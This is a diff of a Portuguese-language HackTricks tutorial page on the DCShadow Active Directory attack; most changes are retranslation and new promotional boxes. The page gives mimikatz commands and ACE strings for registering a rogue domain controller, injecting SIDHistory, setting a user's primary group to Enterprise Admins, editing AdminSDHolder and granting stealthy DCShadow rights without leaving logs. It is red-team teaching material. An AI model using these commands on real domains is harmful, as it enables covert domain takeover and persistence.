@@ -1,26 +1,27 @@
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Outras maneiras de apoiar o HackTricks:
-
-* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
-* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 
 # DCShadow
 
-Registra um **novo Controlador de Domínio** no AD e o utiliza para **inserir atributos** (SIDHistory, SPNs...) em objetos especificados **sem** deixar **logs** sobre as **modificações**. Você **precisa de privilégios DA** e estar dentro do **domínio raiz**.\
-Observe que se você usar dados incorretos, logs bastante feios aparecerão.
+Ele registra um **novo Controlador de Domínio** no AD e o utiliza para **empurrar atributos** (SIDHistory, SPNs...) em objetos especificados **sem** deixar nenhum **log** sobre as **modificações**. Você **precisa de privilégios de DA** e estar dentro do **domínio raiz**.\
+Observe que se você usar dados incorretos, logs bem feios aparecerão.
 
-Para realizar o ataque, você precisa de 2 instâncias do mimikatz. Uma delas iniciará os servidores RPC com privilégios do SISTEMA (você deve indicar aqui as alterações que deseja realizar), e a outra instância será usada para inserir os valores:
+Para realizar o ataque, você precisa de 2 instâncias do mimikatz. Uma delas iniciará os servidores RPC com privilégios de SYSTEM (você deve indicar aqui as alterações que deseja realizar), e a outra instância será usada para empurrar os valores:
 
-{% code title="mimikatz1 (servidores RPC)" %}
+{% code title="mimikatz1 (RPC servers)" %}
 ```bash
 !+
 !processtoken
@@ -34,24 +35,24 @@ lsadump::dcshadow /push
 ```
 {% endcode %}
 
-Observe que **`elevate::token`** não funcionará na sessão `mimikatz1` pois isso eleva os privilégios da thread, mas precisamos elevar o **privilégio do processo**.\
-Você também pode selecionar um objeto "LDAP": `/object:CN=Administrador,CN=Usuários,DC=JEFFLAB,DC=local`
+Observe que **`elevate::token`** não funcionará na sessão `mimikatz1`, pois isso elevou os privilégios da thread, mas precisamos elevar o **privilégio do processo**.\
+Você também pode selecionar um objeto "LDAP": `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`
 
-Você pode aplicar as alterações de um DA ou de um usuário com essas permissões mínimas:
+Você pode enviar as alterações de um DA ou de um usuário com essas permissões mínimas:
 
 * No **objeto de domínio**:
 * _DS-Install-Replica_ (Adicionar/Remover Réplica no Domínio)
 * _DS-Replication-Manage-Topology_ (Gerenciar Topologia de Replicação)
 * _DS-Replication-Synchronize_ (Sincronização de Replicação)
-* O **objeto Sites** (e seus filhos) no **contêiner de Configuração**:
+* O **objeto Sites** (e seus filhos) no **container de Configuração**:
 * _CreateChild e DeleteChild_
-* O objeto do **computador registrado como um DC**:
+* O objeto do **computador que está registrado como um DC**:
 * _WriteProperty_ (Não Write)
 * O **objeto alvo**:
 * _WriteProperty_ (Não Write)
 
-Você pode usar [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) para conceder esses privilégios a um usuário não privilegiado (observe que isso deixará alguns logs). Isso é muito mais restritivo do que ter privilégios de DA.\
-Por exemplo: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose`  Isso significa que o nome de usuário _**student1**_ quando conectado na máquina _**mcorp-student1**_ tem permissões DCShadow sobre o objeto _**root1user**_.
+Você pode usar [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) para conceder esses privilégios a um usuário sem privilégios (observe que isso deixará alguns logs). Isso é muito mais restritivo do que ter privilégios de DA.\
+Por exemplo: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose`  Isso significa que o nome de usuário _**student1**_ ao fazer login na máquina _**mcorp-student1**_ tem permissões DCShadow sobre o objeto _**root1user**_.
 
 ## Usando DCShadow para criar backdoors
 
@@ -61,7 +62,7 @@ lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-28053487
 ```
 {% endcode %}
 
-{% code title="Alterar o PrimaryGroupID (colocar usuário como membro dos Administradores de Domínio)" %}
+{% code title="Alterar PrimaryGroupID (colocar usuário como membro dos Administradores do Domínio)" %}
 ```bash
 lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
 ```
@@ -76,37 +77,35 @@ lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attr
 ```
 {% endcode %}
 
-## Shadowception - Dar permissões DCShadow usando DCShadow (sem logs de permissões modificadas)
+## Shadowception - Dê permissões ao DCShadow usando DCShadow (sem logs de permissões modificados)
 
 Precisamos adicionar os seguintes ACEs com o SID do nosso usuário no final:
 
 * No objeto de domínio:
-* `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;SIDdoUsuário)`
-* `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;SIDdoUsuário)`
-* `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;SIDdoUsuário)`
-* No objeto de computador do atacante: `(A;;WP;;;SIDdoUsuário)`
-* No objeto de usuário alvo: `(A;;WP;;;SIDdoUsuário)`
-* No objeto Sites no contêiner de Configuração: `(A;CI;CCDC;;;SIDdoUsuário)`
+* `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
+* `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
+* `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
+* No objeto do computador atacante: `(A;;WP;;;UserSID)`
+* No objeto do usuário alvo: `(A;;WP;;;UserSID)`
+* No objeto Sites no contêiner de Configuração: `(A;CI;CCDC;;;UserSID)`
 
-Para obter o ACE atual de um objeto: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`
+Para obter o ACE atual de um objeto: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`
 
-Observe que, neste caso, você precisa fazer **várias alterações,** não apenas uma. Portanto, na sessão **mimikatz1** (servidor RPC), use o parâmetro **`/stack` com cada alteração** que deseja fazer. Dessa forma, você só precisará fazer **`/push`** uma vez para realizar todas as alterações empilhadas no servidor falso.
-
-
+Observe que, neste caso, você precisa fazer **várias alterações,** não apenas uma. Portanto, na **sessão mimikatz1** (servidor RPC), use o parâmetro **`/stack` com cada alteração** que deseja fazer. Dessa forma, você só precisará **`/push`** uma vez para realizar todas as alterações acumuladas no servidor rogue.
 
 [**Mais informações sobre DCShadow em ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
 
+{% hint style="success" %}
+Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Outras maneiras de apoiar o HackTricks:
-
-* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
-* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
+* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
+* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Compartilhe truques de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
+{% endhint %}
